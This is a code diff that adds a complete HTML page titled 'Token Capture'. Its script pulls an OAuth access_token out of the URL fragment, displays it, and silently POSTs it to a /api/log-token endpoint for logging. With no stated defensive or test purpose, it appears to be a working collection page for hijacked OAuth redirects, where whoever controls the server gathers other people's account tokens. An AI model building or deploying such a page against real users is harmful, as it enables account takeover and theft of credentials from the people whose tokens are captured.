@@ -1,0 +1,63 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Token Capture</title>
+  <style>
+    body {
+      background-color: #000;
+      color: #0f0;
+      font-family: monospace;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+
+    .token-box {
+      border: 2px solid #0f0;
+      padding: 15px;
+      margin-top: 20px;
+      background-color: #111;
+      word-break: break-all;
+      max-width: 600px;
+      width: 100%;
+      border-radius: 10px;
+      box-shadow: 0 0 10px #0f0;
+    }
+  </style>
+</head>
+<body>
+  <div id="message">Waiting for token...</div>
+  <div id="token-box" class="token-box" style="display: none;"></div>
+
+  <script>
+    window.onload = function () {
+      const hash = window.location.hash;
+      if (hash.includes("access_token=")) {
+        const params = new URLSearchParams(hash.substring(1));
+        const token = params.get("access_token");
+
+        document.getElementById("message").textContent = "OAuth token captured";
+        const tokenBox = document.getElementById("token-box");
+        tokenBox.style.display = "block";
+        tokenBox.textContent = token;
+
+        
+        fetch('/api/log-token', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ token })
+        }).catch(console.error);
+      } else {
+        document.getElementById("message").textContent = "No token found in URL";
+      }
+    };
+  </script>
+</body>
+</html>
